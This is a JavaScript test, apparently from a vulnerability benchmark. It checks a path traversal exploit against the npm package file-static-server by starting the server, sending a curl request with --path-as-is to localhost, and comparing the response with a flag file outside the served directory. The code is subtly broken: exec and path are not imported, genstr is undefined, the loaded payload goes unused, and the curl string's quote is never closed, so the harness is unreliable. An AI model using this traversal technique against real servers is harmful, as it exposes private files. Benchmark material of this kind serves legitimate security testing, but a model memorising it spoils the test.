test("Path Traversal in file-static-server", () => {
  const { exploitFunction } = require("./function.js");
  const { getPayload } = require('./payload.js');

  const payload = getPayload();

  // Require necessary modules
  const fs = require("fs");
  const sleep = require("sleep");
  const { execSync } = require("child_process");

  // Ensure the server is stopped before starting a new one
  try {
    execSync("fuser -k 8970/tcp");
  } catch (e) {}

  // Start the server
  let serverProcess = exec("node ./node_modules/file-static-server/server.js 8970", (error, stdout) => {
    if (error) {
      throw error;
    }

    sleep.sleep(2);

    // Execute the attack string
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8970${genstr(50)}`; // Using the payload's genstr function

    exec(attack_string, (error, stdout) => {
      if (stdout) {
        const expectedContent = fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString();
        expect(stdout).toBe(expectedContent);
      }
    });
  });

  // Cleanup after test
  afterAll(() => {
    serverProcess.kill(); // Stop the server process
  });
});